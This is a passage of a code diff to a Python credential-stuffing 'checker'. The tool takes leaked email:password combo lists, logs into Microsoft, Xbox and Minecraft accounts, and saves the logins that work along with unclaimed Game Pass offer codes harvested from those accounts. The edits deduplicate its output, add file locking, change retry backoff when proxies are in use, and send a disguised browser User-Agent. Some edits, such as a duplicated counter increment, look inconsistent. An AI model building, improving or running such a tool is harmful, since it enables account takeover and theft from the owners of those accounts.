                                     valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                                    with open(f'results/{fname}/Codes.txt', 'a') as f:
-                                        for offer in valid_offer_ids:
-                                            f.write(f'{offer}\n')
+                                    for offer in valid_offer_ids:
+                                        write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                                     shouldContinue = False
                                     for offer in offers:
                                         if offer['offerId'] not in codes:
@@ -2220,9 +2509,8 @@ def checkmc(session, email, password, token, xbox_token):
                                 offers = r.json()['offers']
                                 current_time = datetime.now(timezone.utc)
                                 valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                                with open(f'results/{fname}/Codes.txt', 'a') as f:
-                                    for offer in valid_offer_ids:
-                                        f.write(f'{offer}\n')
+                                for offer in valid_offer_ids:
+                                    write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                                 shouldContinue = False
                                 for offer in offers:
                                     if offer['offerId'] not in codes:
@@ -2247,11 +2535,12 @@ def checkmc(session, email, password, token, xbox_token):
             with stats_lock:
                 xgp += 1
             codes = []
-            with open(f'results/{fname}/XboxGamePass.txt', 'a') as f:
-                f.write(f'{email}:{password}\n')
+            with stats_lock:
+                xgp += 1
+            codes = []
+            write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
             if 'Normal' in acctype:
-                with open(f'results/{fname}/Normal.txt', 'a') as f:
-                    f.write(f'{email}:{password}\n')
+                write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
             try:
                 xsts_attempts = 0
                 while xsts_attempts < maxretries:
@@ -2294,9 +2583,8 @@ def checkmc(session, email, password, token, xbox_token):
                                     offers = r.json()['offers']
                                     current_time = datetime.now(timezone.utc)
                                     valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                                    with open(f'results/{fname}/Codes.txt', 'a') as f:
-                                        for offer in valid_offer_ids:
-                                            f.write(f'{offer}\n')
+                                    for offer in valid_offer_ids:
+                                        write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                                     shouldContinue = False
                                     for offer in offers:
                                         if offer['offerId'] not in codes:
@@ -2322,9 +2610,10 @@ def checkmc(session, email, password, token, xbox_token):
                                 offers = r.json()['offers']
                                 current_time = datetime.now(timezone.utc)
                                 valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
-                                with open(f'results/{fname}/Codes.txt', 'a') as f:
-                                    for offer in valid_offer_ids:
-                                        f.write(f'{offer}\n')
+                                with file_lock:
+                                    with open(f'results/{fname}/Codes.txt', 'a') as f:
+                                        for offer in valid_offer_ids:
+                                            f.write(f'{offer}\n')
                                 shouldContinue = False
                                 for offer in offers:
                                     if offer['offerId'] not in codes:
@@ -2377,7 +2666,7 @@ def checkmc(session, email, password, token, xbox_token):
                     ui.add_log(f'Other: {email} | {items}{meowapi_stats}', 'INFO')
                 return True
             else:
-                return False
+                return True
     else:
         return False
 def mc_token(session, uhs, xsts_token):
@@ -2406,7 +2695,9 @@ def create_optimized_session():
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'})
     pool_size = max(10, config.get('threads', 10))
-    retry_strategy = Retry(total=4, connect=4, read=4, backoff_factor=0.5, status_forcelist=[408, 429, 500, 502, 503, 504], allowed_methods=frozenset(['GET', 'POST']))
+    use_proxies = config.get('use_proxies', False)
+    backoff = 2.5 if not use_proxies else 0.5
+    retry_strategy = Retry(total=4, connect=4, read=4, backoff_factor=backoff, status_forcelist=[408, 429, 500, 502, 503, 504], allowed_methods=frozenset(['GET', 'POST']))
     adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size * 2, max_retries=retry_strategy)
     session.mount('https://', adapter)
     session.mount('http://', adapter)
@@ -2785,7 +3076,7 @@ def Load():
                 line = line.strip()
                 if line and ':' in line:
                     parts = line.split(':', 1)
-                    email_lower = parts[0].strip().lower()
+                    email_lower = ''.join(c for c in parts[0].strip().lower() if c.isprintable() and not c.isspace())
                     password = parts[1].strip()
                     dedupe_key = f'{email_lower}:{password}'
                     if dedupe_key not in seen:
@@ -2793,6 +3084,12 @@ def Load():
                         unique_lines.append(line)
             Combos = unique_lines
             dupes_removed = len(lines) - len(Combos)
+            if dupes_removed > 0:
+                try:
+                    with open(filename, 'w', encoding='utf-8') as f:
+                        f.write('\n'.join(unique_lines) + '\n')
+                except:
+                    pass
             print(f"\n{Fore.BLUE}{'=' * 60}")
             print(f'{Fore.CYAN}📄 File Statistics:')
             print(f'{Fore.BLUE}  • Duplicates Removed: {dupes_removed}')
